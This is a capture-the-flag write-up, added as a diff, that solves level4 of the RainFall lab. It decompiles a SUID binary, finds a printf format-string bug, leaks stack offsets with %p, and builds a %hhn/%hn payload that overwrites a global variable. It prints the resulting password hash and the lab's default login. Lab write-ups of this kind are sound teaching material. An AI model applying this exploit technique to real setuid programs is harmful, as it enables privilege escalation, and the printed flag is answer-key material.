@@ -1,0 +1,92 @@
+When we change to level4 user, we're greeted with:
+
+```shell
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
+```
+
+We find another SUID executable, this time owned by level5.
+
+```shell
+level4@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level5 users 5366 Mar  6  2016 level4
+```
+
+When running it, it takes input and print the input.
+
+```shell
+level3@RainFall:~$ ./level4
+42
+42
+```
+Copying it over and decompiling.
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ scp -P 4242 level4@192.168.184.128:/home/user/level4/level4 .
+          _____       _       ______    _ _
+         |  __ \     (_)     |  ____|  | | |
+         | |__) |__ _ _ _ __ | |__ __ _| | |
+         |  _  /  _` | | '_ \|  __/ _` | | |
+         | | \ \ (_| | | | | | | | (_| | | |
+         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|
+
+                 Good luck & Have fun
+
+  To start, ssh with level0/level0 on 192.168.184.128:4242
+level4@192.168.184.128's password:
+level4                                                                                                                                100% 5366   892.7KB/s   00:00
+```
+
+The decompiled code looks like this:
+
+```C
+void p(char *param_1)
+{
+  printf(param_1);
+  return;
+}
+
+void n(void)
+{
+  char local_20c [520];
+  
+  fgets(local_20c,0x200,stdin);
+  p(local_20c);
+  if (m == 0x1025544) {
+    system("/bin/cat /home/user/level5/.pass");
+  }
+  return;
+}
+
+void main(void)
+{
+  n();
+  return;
+}
+```
+
+Similar to last level, we have a format string vulnerability here, this time the location of the format buffer on the stack is different because our print is in different function. But we can easily find out where our buffer is on stack easily by reading the stack.
+
+```shell
+level4@RainFall:~$ ./level4
+AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
+AAAA0xb7ff26b0.0xbffff784.0xb7fd0ff4.(nil).(nil).0xbffff748.0x804848d.0xbffff540.0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70
+```
+
+As you can see, our buffer is at the 12th address on the stack. So now we need to write the value `0x1025544` to the global variable `m`, but the value is too big to write it in one go, so we need to split up, so we can write `0x44` in the 1st byte of the variable, `0x55` on the 2nd byte and `0x102` on the last 2 bytes. To do so we can use the length specifier together with `%n` so we can write 1 or 2 bytes at a time.
+
+Our global variable `m` address is at `0x08049810`. With this we can build our payload.
+
+```python
+python -c 'print "\x10\x98\x04\x08" + "\x11\x98\x04\x08" + "\x12\x98\x04\x08" + "A"*56 + "%12$hhn" + "A"*17 + "%13$hhn" + "A"*173 + "%14$hn"'
+```
+
+Let's run it
+
+```shell
+level4@RainFall:~$ cat /tmp/payload - | ./level4
+���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
